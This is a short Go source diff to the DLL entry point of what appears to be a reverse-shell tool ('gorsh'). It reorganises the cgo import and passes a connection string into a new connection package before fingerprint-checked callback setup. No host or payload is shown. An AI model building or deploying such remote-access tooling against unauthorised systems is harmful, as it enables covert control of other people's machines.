@@ -1,14 +1,18 @@
 package main
 
 //#include "dllmain.h"
+
+// #cgo CFLAGS: -Wno-error
+import "C"
+
 import (
-	"C"
 	"encoding/hex"
 	"os"
 	"strings"
 	"unsafe"
 
 	"github.com/audibleblink/gorsh/internal/core"
+	"github.com/audibleblink/gorsh/internal/myconn"
 )
 
 var (
@@ -18,6 +22,7 @@ var (
 
 func run() {
 	if connectString != "" && fingerPrint != "" {
+		myconn.ConnectionString = connectString
 		fprint := strings.Replace(fingerPrint, ":", "", -1)
 		bytesFingerprint, err := hex.DecodeString(fprint)
 		if err != nil {
